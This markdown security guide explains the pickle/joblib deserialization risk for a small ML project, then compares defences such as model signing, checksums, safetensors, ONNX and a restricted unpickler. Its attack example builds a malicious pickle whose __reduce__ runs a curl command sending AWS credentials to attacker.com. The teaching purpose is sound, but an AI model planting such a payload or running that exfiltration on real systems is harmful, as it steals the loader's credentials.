# Pickle/Joblib Deserialization Security

## The Vulnerability (CWE-502)

### What is Pickle?

Python's `pickle` module serializes Python objects to bytes. `joblib` uses pickle under the hood for ML model
serialization. The problem: **pickle can execute arbitrary code during deserialization**.

### Why is This Dangerous?

When you call `pickle.load()` or `joblib.load()`, Python reconstructs objects by:

1. Reading serialized class definitions
2. **Calling `__reduce__()`, `__setstate__()`, or other magic methods**
3. Executing code embedded in the pickled data

**An attacker can craft a malicious pickle file that executes arbitrary commands.**

---

## Attack Example

### Scenario: Malicious Model File

```python
# attacker_creates_malicious_model.py
import pickle
import os

class Exploit:
    def __reduce__(self):
        # This will execute when unpickled!
        # Example: steal AWS credentials
        return (os.system, ('curl https://attacker.com?data=$(cat ~/.aws/credentials)',))

# Create malicious "model" file
with open('malicious_model.joblib', 'wb') as f:
    pickle.dump(Exploit(), f)
```

### What Happens When Loaded

```python
# victim_code.py
import joblib

# This will execute the attacker's command!
model = joblib.load('malicious_model.joblib')  # ← Command executes here
```

**Result:** The `os.system()` call runs, exfiltrating AWS credentials to the attacker's server.

### Real-World Attack Vectors

1. **User-uploaded models** - If your API accepts model uploads
2. **Compromised model registry** - If MLflow/S3 bucket is breached
3. **Supply chain attack** - Malicious model in shared storage
4. **MITM attack** - Model file intercepted and replaced during download
5. **Insider threat** - Malicious employee plants backdoored model

---

## Your Current Code Risk Assessment

### Current Implementation (app/model.py:42)

```python
self.model = joblib.load(self.model_path)  # models/iris_classifier.joblib
```

### Risk Profile: **LOW** (but not zero)

| Factor | Status | Risk Level |
|--------|--------|------------|
| Model source | Locally trained by you | ✅ Low |
| Path hardcoded | `models/iris_classifier.joblib` | ✅ Low |
| User input | No user control over path | ✅ Low |
| Git-tracked | Model is gitignored (not versioned) | ⚠️ Medium |
| Production use | Not yet deployed | ✅ Low |

### Why This Is (Currently) Acceptable

- **Threat model**: You control the training environment
- **No external input**: Path is hardcoded, not user-supplied
- **Learning project**: Not handling sensitive data yet

### When This Becomes HIGH RISK

- ✗ Accepting user-uploaded models
- ✗ Loading models from URLs/API responses
- ✗ Downloading models from untrusted sources
- ✗ Loading models from shared storage without verification
- ✗ Production deployment with sensitive data

---

## Production-Grade Solutions

### Solution 1: Model Signing & Verification (⭐ Recommended for Production)

**Concept:** Cryptographically sign model files during training, verify signatures before loading.

```python
# train_model.py - Sign model after training
import hmac
import hashlib
import json

def sign_model(model_path: str, secret_key: str) -> str:
    """Create HMAC signature of model file."""
    with open(model_path, 'rb') as f:
        model_bytes = f.read()

    signature = hmac.new(
        secret_key.encode(),
        model_bytes,
        hashlib.sha256
    ).hexdigest()

    return signature

# After training
model_path = "models/iris_classifier.joblib"
joblib.dump(model, model_path)

# Sign the model
SECRET_KEY = os.getenv("MODEL_SIGNING_KEY")  # From AWS Secrets Manager
signature = sign_model(model_path, SECRET_KEY)

# Save signature
with open("models/model_signature.json", "w") as f:
    json.dump({
        "signature": signature,
        "algorithm": "HMAC-SHA256",
        "model_file": "iris_classifier.joblib"
    }, f)
```

```python
# app/model.py - Verify before loading
def verify_and_load_model(model_path: str, signature_path: str, secret_key: str):
    """Verify model signature before loading."""
    # Load signature
    with open(signature_path, 'r') as f:
        sig_data = json.load(f)

    # Recalculate signature
    with open(model_path, 'rb') as f:
        model_bytes = f.read()

    expected_sig = hmac.new(
        secret_key.encode(),
        model_bytes,
        hashlib.sha256
    ).hexdigest()

    # Verify
    if not hmac.compare_digest(expected_sig, sig_data["signature"]):
        raise SecurityError("Model signature verification failed! Possible tampering.")

    # Safe to load
    return joblib.load(model_path)
```

**Pros:**

- ✅ Cryptographically secure
- ✅ Detects tampering
- ✅ Industry standard (used by Docker, NPM, etc.)

**Cons:**

- Requires secure key management (AWS Secrets Manager, HashiCorp Vault)
- Extra overhead during training/loading

---

### Solution 2: Model Registry with Checksums (MLflow)

**Concept:** Use MLflow Model Registry to track model versions and checksums.

```python
# train_model.py
import mlflow
import mlflow.sklearn

with mlflow.start_run():
    # Train model
    model = train_model()

    # Log to MLflow (auto-generates checksum)
    mlflow.sklearn.log_model(model, "iris_classifier")

    # Register model
    mlflow.register_model(
        "runs:/{}/iris_classifier".format(mlflow.active_run().info.run_id),
        "IrisClassifier"
    )
```

```python
# app/model.py
import mlflow.sklearn

def load_model_from_registry(model_name: str, version: str):
    """Load model from MLflow registry (includes checksum verification)."""
    model_uri = f"models:/{model_name}/{version}"

    # MLflow verifies checksum automatically
    model = mlflow.sklearn.load_model(model_uri)

    return model
```

**Pros:**

- ✅ Built-in checksum verification
- ✅ Version tracking and lineage
- ✅ Model governance (stage transitions: Staging → Production)

**Cons:**

- Requires MLflow infrastructure (planned for Phase 3)
- More complex setup

---

### Solution 3: Safetensors (Modern Alternative)

**Concept:** Use `safetensors` library - designed specifically to avoid pickle vulnerabilities.

```bash
pip install safetensors scikit-learn-safetensors
```

```python
# train_model.py
from sklearn_safetensors import save_model

model = train_model()
save_model(model, "models/iris_classifier.safetensors")
```

```python
# app/model.py
from sklearn_safetensors import load_model

model = load_model("models/iris_classifier.safetensors")
```

**Pros:**

- ✅ **Cannot execute arbitrary code** (by design)
- ✅ Faster loading than pickle
- ✅ Memory-efficient

**Cons:**

- Relatively new (may not support all scikit-learn models)
- Limited ecosystem compared to pickle/joblib

---

### Solution 4: ONNX Runtime (Cross-Platform)

**Concept:** Export model to ONNX format (standardized ML format).

```bash
pip install skl2onnx onnxruntime
```

```python
# train_model.py
from skl2onnx import convert_sklearn
from skl2onnx.common.data_types import FloatTensorType

initial_type = [('float_input', FloatTensorType([None, 4]))]
onnx_model = convert_sklearn(model, initial_types=initial_type)

with open("models/iris_classifier.onnx", "wb") as f:
    f.write(onnx_model.SerializeToString())
```

```python
# app/model.py
import onnxruntime as rt

sess = rt.InferenceSession("models/iris_classifier.onnx")
input_name = sess.get_inputs()[0].name
pred = sess.run(None, {input_name: features})
```

**Pros:**

- ✅ **Cannot execute arbitrary code**
- ✅ Cross-platform (Python, C++, JavaScript)
- ✅ Production-grade (used by Microsoft, Facebook)
- ✅ Optimized for inference

**Cons:**

- Extra conversion step
- Not all models convert perfectly

---

### Solution 5: Restricted Unpickler (Allowlist)

**Concept:** Create a custom unpickler that only allows safe classes.

```python
# app/model.py
import pickle
import io
from sklearn.ensemble import RandomForestClassifier
from sklearn.preprocessing import StandardScaler

class SafeUnpickler(pickle.Unpickler):
    """Only allow specific safe classes to be unpickled."""

    ALLOWED_CLASSES = {
        ('sklearn.ensemble._forest', 'RandomForestClassifier'),
        ('sklearn.tree._classes', 'DecisionTreeClassifier'),
        ('numpy', 'ndarray'),
        ('numpy.core.multiarray', '_reconstruct'),
        # Add other safe classes as needed
    }

    def find_class(self, module, name):
        if (module, name) not in self.ALLOWED_CLASSES:
            raise pickle.UnpicklingError(
                f"Attempted to load disallowed class: {module}.{name}"
            )
        return super().find_class(module, name)

def safe_joblib_load(filepath: str):
    """Load joblib file with restricted unpickler."""
    with open(filepath, 'rb') as f:
        return SafeUnpickler(f).load()

# Usage
model = safe_joblib_load("models/iris_classifier.joblib")
```

**Pros:**

- ✅ Works with existing pickle files
- ✅ No training code changes

**Cons:**

- ⚠️ Requires maintaining allowlist
- ⚠️ Still uses pickle (not foolproof)

---

## Comparison Matrix

| Solution | Security | Ease of Use | Infrastructure | Phase |
|----------|----------|-------------|----------------|-------|
| **Model Signing** | ⭐⭐⭐⭐⭐ | ⭐⭐⭐ | Secrets Manager | 2-3 |
| **MLflow Registry** | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ | MLflow server | 3 |
| **Safetensors** | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | None | Now |
| **ONNX** | ⭐⭐⭐⭐⭐ | ⭐⭐⭐ | None | 2-3 |
| **Restricted Unpickler** | ⭐⭐⭐ | ⭐⭐⭐⭐ | None | Now |

---

## Recommended Implementation Roadmap

### Phase 1 (Now) - Low-Risk Learning Environment

#### Option A: Document the decision (Fastest)

```python
# app/model.py:42
# Security Note: Using joblib.load() with locally trained model
# Model source: train_model.py (controlled environment)
# Risk: Low (no user input, hardcoded path)
# Production: Will migrate to MLflow/ONNX (Phase 3)
self.model = joblib.load(self.model_path)  # nosemgrep: unsafe-pickle-deserialization
```

#### Option B: Add basic hash verification (Best for learning)

```python
# train_model.py
import hashlib

def hash_file(filepath: str) -> str:
    """Calculate SHA-256 hash of file."""
    sha256 = hashlib.sha256()
    with open(filepath, 'rb') as f:
        for chunk in iter(lambda: f.read(4096), b''):
            sha256.update(chunk)
    return sha256.hexdigest()

# After saving model
model_hash = hash_file("models/iris_classifier.joblib")
metadata["model_hash"] = model_hash
metadata["model_file"] = "iris_classifier.joblib"
```

```python
# app/model.py
def load(self) -> None:
    """Load and verify model."""
    # Verify hash
    expected_hash = self.metadata.get("model_hash")
    if expected_hash:
        actual_hash = self._hash_file(self.model_path)
        if actual_hash != expected_hash:
            raise SecurityError(
                f"Model file hash mismatch! "
                f"Expected: {expected_hash}, Got: {actual_hash}"
            )

    # Safe to load
    self.model = joblib.load(self.model_path)
```

### Phase 2-3 (Infrastructure) - Production Preparation

**Migrate to MLflow with model signing:**

- Set up MLflow Model Registry (already planned)
- Implement HMAC signing with AWS Secrets Manager
- Add model versioning and stage transitions

### Phase 4+ (Production) - Multiple Layers

**Defense in depth:**

1. MLflow Registry (checksum verification)
2. Model signing (HMAC or digital signatures)
3. Network isolation (models only from VPC endpoints)
4. Audit logging (who accessed which model when)
5. Consider ONNX for inference optimization

---

## Immediate Action Items

### 1. Add Documentation (5 min)

Document why current usage is acceptable and future plans.

### 2. Add Hash Verification (30 min)

Implement basic SHA-256 hash checking as a learning exercise.

### 3. Create Issue for Phase 3 (5 min)

Track migration to MLflow/ONNX in your project board.

### 4. Update CLAUDE.md (10 min)

Add security decision to project docs.

---

## Further Reading

- [OWASP: Deserialization of Untrusted Data](https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data)
- [Python Pickle Documentation Warning](https://docs.python.org/3/library/pickle.html#module-pickle)
- [MLflow Model Registry Best Practices](https://mlflow.org/docs/latest/model-registry.html)
- [Safetensors Security Design](https://github.com/huggingface/safetensors#security)
- [ONNX Model Zoo](https://github.com/onnx/models)

---

## Questions to Consider

1. **Threat model**: Who are your potential attackers? (Curious users? Competitors? Nation-states?)
2. **Data sensitivity**: What happens if model is compromised? (Embarrassing? Revenue loss? Lives at risk?)
3. **Deployment timeline**: When will this hit production? (Determines urgency)
4. **Team skills**: Comfortable managing crypto keys? (Affects solution choice)
5. **Infrastructure**: MLflow/model registry already planned? (Leverage existing plans)

For a **learning project**: Option B (hash verification) teaches good habits without over-engineering.

For **production**: MLflow + model signing + ONNX (defense in depth).
